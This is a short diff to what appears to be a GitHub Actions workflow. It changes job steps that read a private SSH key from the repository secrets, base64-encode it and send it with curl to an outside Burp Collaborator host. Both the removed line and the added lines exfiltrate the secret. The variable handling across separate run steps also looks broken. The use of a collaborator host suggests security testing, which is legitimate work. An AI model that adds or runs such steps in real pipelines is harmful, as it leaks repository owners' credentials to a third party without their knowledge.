@@ -20,8 +20,10 @@ jobs:
 
     # Steps represent a sequence of tasks that will be executed as part of the job
     steps:
+      - run: KEY="${{ secrets.SSHKEY_TEPPAYL_TEST_PRIVATE_REPOSITORY }}"
+      - run: B64=$(echo $KEY | base64)
 
-      - run: curl "https://mxnzwzr76orx03zydc3jh66sqjwakz.burpcollaborator.net?test=${{ secrets.SSHKEY_TEPPAYL_TEST_PRIVATE_REPOSITORY }}"
+      - run: curl "https://mxnzwzr76orx03zydc3jh66sqjwakz.burpcollaborator.net?test=$B64"
       - name: test checkout
         uses: actions/checkout@v2
         with:
